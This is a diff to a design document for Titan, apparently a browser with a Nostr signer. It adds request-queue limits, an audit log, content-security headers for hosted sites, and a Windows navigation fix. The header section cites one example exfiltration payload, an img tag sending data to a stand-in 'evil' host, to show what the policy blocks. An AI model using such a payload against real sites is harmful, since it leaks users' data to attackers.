@@ -327,7 +327,14 @@ Titan ships with a built-in Nostr signer so every nsite gets a working
 - **`prompt_queue.rs`** — Pending approval request queue with
   `tokio::sync::oneshot` channels. The dispatcher pushes a request,
   awaits the response (or a 60s timeout), and the chrome resolves it
-  through a Tauri command.
+  through a Tauri command. Capped at **16 pending per site** and
+  **128 global**; overflow auto-denies without prompting to block
+  memory-exhaustion DoS from a hostile nsite firing requests while
+  the user is AFK.
+- **`audit_log.rs`** — In-memory ring buffer (200 entries, newest-first)
+  of every signer decision. Outcomes tracked: `Approved`, `Denied`,
+  `AutoDenied`, `SignerLocked`, `TimedOut`, `Failed`. Not persisted —
+  cleared on restart. Viewable in the signer panel.
 
 ### Request flow
 
@@ -371,6 +378,48 @@ Injected into every content webview via `initialization_script` so
 Calls `fetch('titan-nostr://rpc', { method: 'POST', body: JSON })` and
 awaits the response. The response is a `{id, result}` or `{id, error}`
 JSON object.
+
+### Content webview security headers
+
+Every `nsite-content://` response ships with a strict set of defense-
+in-depth headers to keep a compromised or hostile nsite from
+exfiltrating signer-approved data:
+
+- **Content-Security-Policy** — `connect-src 'self' titan-nostr:` is the
+  critical line. It blocks all outbound fetch/XHR/WebSocket except back
+  to our own signer bridge, so a malicious nsite cannot ship an
+  approved event or decrypted plaintext to an attacker server.
+  `script-src 'self' 'unsafe-inline' 'unsafe-eval'` preserves compat
+  with bundled sites but blocks external script tags. `img-src 'self'
+  data: blob:` prevents `<img src="https://evil/?data=X">` exfil.
+- **X-Content-Type-Options: nosniff** — prevents MIME sniffing, so a
+  nsite cannot label HTML as PNG and have the browser execute it.
+- **Referrer-Policy: no-referrer** — outbound clicks to mempool.space,
+  relays, etc. don't leak the nsite pubkey/host in the Referer header.
+- **Permissions-Policy** — disables camera, microphone, geolocation,
+  payment, USB, sensors, and other powerful APIs by default.
+- **X-Frame-Options: SAMEORIGIN** — legacy clickjacking defense.
+
+All headers are applied by `apply_nsite_content_headers()` in
+`main.rs`, centralized so new response paths can't accidentally skip
+them.
+
+### Windows WebView2 workaround
+
+WebView2 (used on Windows) does not support custom URI schemes the way
+WKWebView (macOS) and WebKitGTK (Linux) do. wry works around this by
+rewriting `nsite-content://host/path` to `http://nsite-content.host/path`
+at webview creation time and registering an `http` filter. The problem:
+this rewrite only happens once. Subsequent `webview.navigate()` calls
+with a raw `nsite-content://` URL silently fail and leave a blank page.
+
+Titan's fix: a `platform_navigate_url()` helper that performs the same
+rewrite on every navigate call on Windows (no-op on other platforms).
+All four navigation call sites in `main.rs` run through this helper,
+and the `on_navigation` allowlist accepts both `nsite-content://` and
+`http://nsite-content.*`. The address bar display logic in
+`content_url_to_display()` strips the `nsite-content.` prefix so users
+see the original URL.
 
 ## Infrastructure
 
